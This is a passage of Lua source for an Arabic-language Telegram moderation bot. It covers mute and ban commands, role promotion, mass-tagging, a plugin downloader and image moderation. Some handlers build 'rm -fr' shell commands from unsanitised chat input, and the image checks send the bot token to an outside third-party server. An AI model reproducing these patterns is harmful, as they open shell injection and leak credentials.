function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"*⊀︰ عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه*")   
return false 
end      
if tonumber(result.id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " ⊀︰ لا تسطيع كتم البوت عام")
return false 
end
if result.id_ == tonumber(SUDO) then
send(msg.chat_id_, msg.id_, " ⊀︰ لا يمكنك كتم المطور الاساسي \n")
return false 
end
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..result.title_..'](t.me/'..(username or 'SourcE_RiNdA')..')'
status  = '\n *⊀︰ تم كتمه* عام من الكروبات'
texts = usertext..status
database:sadd(bot_id..'Gmute:User', result.id_)
else
texts = '*⊀︰ لا يوجد حساب بهاذا المعرف*'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match("^كتم عام (%d+)$") and Devmode(msg) then
local userid = text:match("^كتم عام (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if userid == tonumber(SUDO) then
send(msg.chat_id_, msg.id_, " ⊀︰ لا يمكنك كتم المطور الاساسي \n")
return false 
end
if tonumber(userid) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " ⊀︰ لا تسطيع كتم البوت عام")
return false 
end
database:sadd(bot_id..'Gmute:User', userid)

tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..data.first_name_..'](t.me/'..(data.username_ or 'SourcE_RiNdA')..')'
status  = '\n *⊀︰ تم كتمه* عام من الكروبات'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* '..userid..''
status  = '\n *⊀︰ تم كتمه* عام من الكروبات'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
if text == ("الغاء العام") and msg.reply_to_message_id_ and Devmode(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..data.first_name_..'](t.me/'..(data.username_ or 'SourcE_RiNdA')..')'
status  = '\n *⊀︰ تم الغاء (الحظر-الكتم) عام من الكروبات*'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
database:srem(bot_id..'GBan:User', result.sender_user_id_)
database:srem(bot_id..'Gmute:User', result.sender_user_id_)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^الغاء العام @(.*)$") and Devmode(msg) then
local username = text:match("^الغاء العام @(.*)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..result.title_..'](t.me/'..(username or 'SourcE_RiNdA')..')'
status  = '\n *⊀︰ تم الغاء (الحظر-الكتم) عام من الكروبات*'
texts = usertext..status
database:srem(bot_id..'GBan:User', result.id_)
database:srem(bot_id..'Gmute:User', result.id_)
else
texts = '*⊀︰ لا يوجد حساب بهاذا المعرف*'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match("^الغاء العام (%d+)$") and Devmode(msg) then
local userid = text:match("^الغاء العام (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:srem(bot_id..'GBan:User', userid)
database:srem(bot_id..'Gmute:User', userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..data.first_name_..'](t.me/'..(data.username_ or 'SourcE_RiNdA')..')'
status  = '\n *⊀︰ تم الغاء (الحظـࢪ > والكتـم) مـن كل كࢪوبات بـوت*'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* '..userid..''
status  = '\n *⊀︰ تـم حظـࢪته عام ..🕸️*'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
------------------------------------------------------------------------
if text == ("مسح المطورين") and Devmode(msg) then
database:del(bot_id..'Sudo:User')
send(msg.chat_id_, msg.id_, "\n ⊀︰ تم مسح قائمة المطورين  ")
end
if text == ("المطورين") and Devmode(msg) then
local list = database:smembers(bot_id..'Sudo:User')
t = "\n ⊀︰ قائمة مطورين البوت \n●━━━━𝐑𝐀━━━━●\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = " ⊀︰ لا يوجد مطورين"
end
send(msg.chat_id_, msg.id_, t)
end


if text == "all" or text == "@all" and CoSu(msg) then
if not database:get(bot_id..'Cick:all'..msg.chat_id_) then
if database:get(bot_id.."MODE7:all:Time"..msg.chat_id_..':'..msg.sender_user_id_) then  
return 
send(msg.chat_id_, msg.id_,"*انتظر دقيقه من فضلك*")
end
database:setex(bot_id..'MODE7:all:Time'..msg.chat_id_..':'..msg.sender_user_id_,300,true)
tdcli_function({ID="GetChannelFull",channel_id_ = msg.chat_id_:gsub('-100','')},function(argg,dataa) 
tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = dataa.member_count_},function(ta,mode)
x = 0
tags = 0
local list = mode.members_
for k, v in pairs(list) do
tdcli_function({ID="GetUser",user_id_ = v.user_id_},function(arg,data)
if x == 5 or x == tags or k == 0 then
tags = x + 5
t = "#all"
end
x = x + 1
tagname = data.first_name_
tagname = tagname:gsub("]","")
tagname = tagname:gsub("[[]","")
t = t..", ["..tagname.."](tg://user?id="..v.user_id_..")"
if x == 5 or x == tags or k == 0 then
local Text = t:gsub('#all,','#all\n')
sendText(msg.chat_id_,Text,0,'md')
end
end,nil)
end
end,nil)
end,nil)
end
end

if text == 'الملفات' and Devmode(msg) then
t = ' ⊀︰ ملفات السورس ريندا ↓\n ●━━━━𝐑𝐀━━━━● \n'
i = 0
for v in io.popen('ls File_Bot'):lines() do
if v:match(".lua$") then
i = i + 1
t = t..i..'- الملف > {'..v..'}\n'
end
end
send(msg.chat_id_, msg.id_,t)
end
if text == "متجر الملفات" or text == 'المتجر' then
if Devmode(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/RiNdA-SourcE/Files_RiNdA/main/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n ⊀︰ اهلا بك في متجر ملفات ريندا\n ⊀︰ ملفات السورس ↓\n●━━━━𝐑𝐀━━━━●\n\n"
local TextE = "\n●━━━━𝐑𝐀━━━━●\n ⊀︰ علامة تعني { √ } ملف مفعل\n ⊀︰ علامة تعني { × } ملف معطل\n ⊀︰ قناة سورس ريندا ↓\n".." ⊀︰ [اضغط هنا لدخول](t.me/SourcE_RiNdA) \n"
local NumFile = 0
for name,Info in pairs(res.plugins_) do
local Check_File_is_Found = io.open("File_Bot/"..name,"r")
if Check_File_is_Found then
io.close(Check_File_is_Found)
CeckFile = "(√)"
else
CeckFile = "(×)"
end
NumFile = NumFile + 1
TextS = TextS..'*'..NumFile.."→* {`"..name..'`} > '..CeckFile..'\n[-Information]('..Info..')\n'
end
send(msg.chat_id_, msg.id_,TextS..TextE) 
end
else
send(msg.chat_id_, msg.id_," ⊀︰ لا يوجد اتصال من ال api \n") 
end
return false
end
end

if text and text:match("^(تعطيل) (.*)(.lua)$") and Devmode(msg) then
local name_t = {string.match(text, "^(تعطيل) (.*)(.lua)$")}
local file = name_t[2]..'.lua'
local file_bot = io.open("File_Bot/"..file,"r")
if file_bot then
io.close(file_bot)
t = " ⊀︰ الملف > "..file.."\n ⊀︰ تم تعطيل ملف \n"
else
t = " ⊀︰ بالتاكيد تم تعطيل ملف → "..file.."\n"
end
local json_file, res = https.request("https://raw.githubusercontent.com/RiNdA-SourcE/Files_RiNdA/main/File_Bot/"..file)
if res == 200 then
os.execute("rm -fr File_Bot/"..file)
send(msg.chat_id_, msg.id_,t) 
dofile('RiNdA.lua')  
else
send(msg.chat_id_, msg.id_," ⊀︰ عذرا الملف لايدعم سورس ريندا \n") 
end
return false
end
if text and text:match("^(تفعيل) (.*)(.lua)$") and Devmode(msg) then
local name_t = {string.match(text, "^(تفعيل) (.*)(.lua)$")}
local file = name_t[2]..'.lua'
local file_bot = io.open("File_Bot/"..file,"r")
if file_bot then
io.close(file_bot)
t = " ⊀︰ بالتاكيد تم تفعيل ملف → "..file.." \n"
else
t = " ⊀︰ الملف > "..file.."\n ⊀︰ تم تفعيل ملف \n"
end
local json_file, res = https.request("https://raw.githubusercontent.com/RiNdA-SourcE/Files_RiNdA/main/File_Bot/"..file)
if res == 200 then
local chek = io.open("File_Bot/"..file,'w+')
chek:write(json_file)
chek:close()
send(msg.chat_id_, msg.id_,t) 
dofile('RiNdA.lua')  
else
send(msg.chat_id_, msg.id_," ⊀︰ عذرا الملف لايدعم سورس ريندا \n") 
end
return false
end
if text == "مسح الملفات" and Devmode(msg) then
os.execute("rm -fr File_Bot/*")
send(msg.chat_id_,msg.id_," ⊀︰ تم مسح الملفات")
return false
end

if text == ("ارفع مطور") and msg.reply_to_message_id_ and Devmode(msg) then
function start_function(extra, result, success)
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:sadd(bot_id..'Sudo:User', result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..data.first_name_..'](t.me/'..(data.username_ or 'SourcE_RiNdA')..')'
status  = '\n *⊀︰ تمَ رفعَهہ↫ مطور*'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false 
end
if text and text:match("^ارفع مطور @(.*)$") and Devmode(msg) then
local username = text:match("^ارفع مطور @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"⚠| عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
database:sadd(bot_id..'Sudo:User', result.id_)
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..result.title_..'](t.me/'..(username or 'SourcE_RiNdA')..')'
status  = '\n *⊀︰ تمَ رفعَهہ↫ مطور*'
texts = usertext..status
else
texts = '*⊀︰ لا يوجد حساب بهاذا المعرف*'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false 
end
if text and text:match("^ارفع مطور (%d+)$") and Devmode(msg) then
local userid = text:match("^ارفع مطور (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:sadd(bot_id..'Sudo:User', userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..data.first_name_..'](t.me/'..(data.username_ or 'SourcE_RiNdA')..')'
status  = '\n *⊀︰ تمَ رفعَهہ↫ مطور*'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* '..userid..''
status  = '\n *⊀︰ تمَ رفعَهہ↫ مطور*'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false 
end
if text == ("نزل مطور") and msg.reply_to_message_id_ and Devmode(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Sudo:User', result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..data.first_name_..'](t.me/'..(data.username_ or 'SourcE_RiNdA')..')'
status  = '\n *⊀︰ تم نزله من المطورين*'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false 
end
if text and text:match("^نزل مطور @(.*)$") and Devmode(msg) then
local username = text:match("^نزل مطور @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ لا ����ستطيع استخدام البوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
database:srem(bot_id..'Sudo:User', result.id_)
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..result.title_..'](t.me/'..(username or 'SourcE_RiNdA')..')'
status  = '\n *⊀︰ تم نزله من المطورين*'
texts = usertext..status
else
texts = '*⊀︰ لا يوجد حساب بهاذا المعرف*'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end  
if text and text:match("^نزل مطور (%d+)$") and Devmode(msg) then
local userid = text:match("^نزل مطور (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:srem(bot_id..'Sudo:User', userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..data.first_name_..'](t.me/'..(data.username_ or 'SourcE_RiNdA')..')'
status  = '\n *⊀︰ تم نزله من المطورين*'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* '..userid..''
status  = '\n *⊀︰ تم نزله من المطورين*'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false 
end
if text == ("مسح قائمه المالك") and Sudo(msg) then
database:del(bot_id..'CoSu'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '\n ⊀︰ تم مسح قائمه المالك')
return false
end

if text == 'قائمه المالك' and Sudo(msg) then
local list = database:smembers(bot_id..'CoSu'..msg.chat_id_)
t = "\n ⊀︰ قائمه المالك \n●━━━━𝐑𝐀━━━━●\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = "* ⊀︰ لا يوجد احد في قائمه المالك*"
end
send(msg.chat_id_, msg.id_, t)
return false
end
if text == ("صيح للمالك") or text == ("تاك للمالك") then
local list = database:smembers(bot_id..'CoSu'..msg.chat_id_)
t = "\n ⊀︰ وينكم تعالو يريدوكم بالكروب \n●━━━━𝐑𝐀━━━━●\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- {[@"..username.."]}\n"
else
t = t..""..k.."- {"..v.."}\n"
end
end
if #list == 0 then
t = "* ⊀︰ لا يوجد احد في قائمه المالك*"
end
send(msg.chat_id_, msg.id_, t)
end

if text == ("ارفع مالك") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'CoSu'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..data.first_name_..'](t.me/'..(data.username_ or 'SourcE_RiNdA')..')'
status  = '\n *⊀︰ تمَ رفعَهہ↫ مالك*'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^ارفع مالك @(.*)$") and Sudo(msg) then
local username = text:match("^ارفع مالك @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"*⊀︰ عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه*")   
return false 
end      
database:sadd(bot_id..'CoSu'..msg.chat_id_, result.id_)
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..result.title_..'](t.me/'..(username or 'SourcE_RiNdA')..')'
status  = '\n *⊀︰ تمَ رفعَهہ↫ مالك*'
texts = usertext..status
else
texts = '*⊀︰ لا يوجد حساب بهاذا المعرف*'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match("^ارفع مالك (%d+)$") and Sudo(msg) then
local userid = text:match("^ارفع مالك (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:sadd(bot_id..'CoSu'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..data.first_name_..'](t.me/'..(data.username_ or 'SourcE_RiNdA')..')'
status  = '\n *⊀︰ تمَ رفعَهہ↫ مالك*'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* '..userid..''
status  = '\n *⊀︰ تمَ رفعَهہ↫ مالك*'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
if text == ("نزل مالك") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'CoSu'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..data.first_name_..'](t.me/'..(data.username_ or 'SourcE_RiNdA')..')'
status  = '\n *⊀︰ تم نزله من المالكين*'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^نزل مالك @(.*)$") and Sudo(msg) then
local username = text:match("^نزل مالك @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
database:srem(bot_id..'CoSu'..msg.chat_id_, result.id_)
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..result.title_..'](t.me/'..(username or 'SourcE_RiNdA')..')'
status  = '\n *⊀︰ تم نزله من المالكين*'
texts = usertext..status
else
texts = '*⊀︰ لا يوجد حساب بهاذا المعرف*'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match("^نزل مالك (%d+)$") and Sudo(msg) then
local userid = text:match("^نزل مالك (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:srem(bot_id..'CoSu'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..data.first_name_..'](t.me/'..(data.username_ or 'SourcE_RiNdA')..')'
status  = '\n *⊀︰ تم نزله من المالكين*'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* '..userid..''
status  = '\n *⊀︰ تم نزله من المالكين*'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
------------------------------------------------------------------------

if (msg.content_.sticker_)  and msg.reply_to_message_id_ == 0 and database:get(bot_id.."lock:Lock:Sexy"..msg.chat_id_)=="del" then      
sticker_id = msg.content_.sticker_.sticker_.persistent_id_
st = https.request('https://black-source.tk/BlackTeAM/ImageInfo.php?token='..token..'&url='..sticker_id.."&type=sticker")
eker = JSON.decode(st)
if eker.ok.Info == "Indecent" then
local list = database:smembers(bot_id.."Basic:Constructor"..msg.chat_id_)
t = "⊀︰ المنشئين الاساسين تعالو مخرب \n●━━━━𝐑𝐀━━━━●\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = "⊀︰ ماكو منششئين يشوفولك جاره"
end
Reply_Status(msg,msg.sender_user_id_,"reply","⊀︰ قام بنشر ملصق اباحيه\n"..t)  
DeleteMessage(msg.chat_id_,{[0] = tonumber(msg.id_),msg.id_})   
end   
end
if (msg.content_.photo_) and msg.reply_to_message_id_ == 0 and database:get(bot_id.."lock:Lock:Sexy"..msg.chat_id_)=="del" then
photo_id = msg.content_.photo_.sizes_[1].photo_.persistent_id_  
Srrt = https.request('https://black-source.tk/BlackTeAM/ImageInfo.php?token='..token..'&url='..photo_id.."&type=photo")
Sto = JSON.decode(Srrt)
if Sto.ok.Info == "Indecent" then
local list = database:smembers(bot_id.."Basic:Constructor"..msg.chat_id_)
t = "⊀︰ المنشئين الاساسين تعالو مخرب \n●━━━━𝐑𝐀━━━━●\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = "*⊀︰ ماكو منششئين يشوفولك جاره*"
end
Reply_Status(msg,msg.sender_user_id_,"reply","⊀︰ قام بنشر صوره اباحيه\n"..t)  
DeleteMessage(msg.chat_id_,{[0] = tonumber(msg.id_),msg.id_})   
end   
end
if text == 'تفعيل التحويل' and CoSu(msg) then   
if database:get(bot_id..'DRAGOON:change:mode'..msg.chat_id_) then
Text = '*⊀︰ تم تفعيل تحويل الصيغ*'
database:del(bot_id..'DRAGOON:change:mode'..msg.chat_id_)  
else
Text = '* ⊀︰ بالتاكيد تم تفعيل امر تحويل*'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل التحويل' and CoSu(msg) then  
if not database:get(bot_id..'DRAGOON:change:mode'..msg.chat_id_) then
database:set(bot_id..'DRAGOON:change:mode'..msg.chat_id_,true)  
Text = '\n ⊀︰ تم تعطيل امر تحويل'
else
Text = '\n ⊀︰ بالتاكيد تم تعطيل امر تحويل'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تحويل' and not database:get(bot_id..'DRAGOON:change:mode'..msg.chat_id_) then  
if tonumber(msg.reply_to_message_id_) > 0 then
function by_reply(extra, result, success)   
if result.content_.photo_ then 
local pn = result.content_.photo_.sizes_[1].photo_.persistent_id_
Addsticker(msg,msg.chat_id_,pn,msg.sender_user_id_..'.png')
end   
end
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
if text == 'تحويل' and not database:get(bot_id..'DRAGOON:change:mode'..msg.chat_id_) then  
if tonumber(msg.reply_to_message_id_) > 0 then
